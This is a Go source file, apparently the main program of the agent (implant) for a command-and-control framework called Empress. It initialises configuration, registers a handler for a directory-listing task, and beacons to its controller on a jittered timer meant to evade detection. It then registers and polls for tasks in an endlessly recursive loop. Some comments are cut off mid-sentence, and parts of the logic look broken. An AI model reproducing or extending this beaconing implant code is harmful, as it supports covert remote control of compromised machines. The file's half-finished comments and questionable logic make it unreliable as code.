//go:build !debug

package main

import (
	"github.com/pygrum/Empress/c2"
	"github.com/pygrum/Empress/config"
	"github.com/pygrum/Empress/tasks"
	"github.com/pygrum/Empress/transport"
	"math/rand"
	"os"
	"time"
)

var (
	client *c2.Client
)

func main() {
	if err := config.Initialize(); err != nil {
		os.Exit(1)
	}
	client = newClient()

	tickSalt := config.C.CallbackSalt
	r := rand.New(rand.NewSource(time.Now().Unix()))
	ticker := time.NewTicker((config.C.CallbackInterval * 1000 * time.Millisecond) - (tickSalt * time.Millisecond))
	for range ticker.C {
		// sleep for a random time between 0 and tickSalt milliseconds.
		// because the ticker ticks every interval-tickSalt seconds,
		time.Sleep(time.Duration(r.Intn(int(tickSalt))) * time.Millisecond)
		// first registration needs no data
		if err := run(c2.Registration(nil)); err != nil {
			continue
		}
	}
}

func newClient() *c2.Client {
	client = c2.NewClient()

	router := c2.NewRouter()
	router.HandleFunc(tasks.OpLS, tasks.CmdLS)

	client.SetRouter(router)
	return client
}

func run(registration *transport.Registration) error {
	// start by registering. if registration fails then we must die.
	// this is because registration happens literally right
	if err := client.Register(registration); err != nil {
		return err
	}
	reg, _ := client.Poll()
	return run(reg)
}
